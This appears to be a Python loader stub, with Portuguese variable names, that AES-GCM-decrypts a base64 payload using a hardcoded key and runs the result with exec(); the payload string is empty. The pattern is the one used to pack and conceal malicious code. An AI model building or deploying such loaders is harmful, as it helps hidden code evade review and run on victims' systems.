import base64, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

chave = b'Y\x98\xce\xeb\xbc\xfc"\xc1\x8eBS\xce\xb9\xcc\xda\n\xb03\x12\xb1\xf7U\xe57\x89\x02\xa4\xe7\xad\xa1P\xfd'
payload_b64 = ""

payload = base64.b64decode(payload_b64)
nonce = payload[:12]
dados_criptografados = payload[12:]

aesgcm = AESGCM(chave)
codigo = aesgcm.decrypt(nonce, dados_criptografados, None)
exec(codigo.decode())
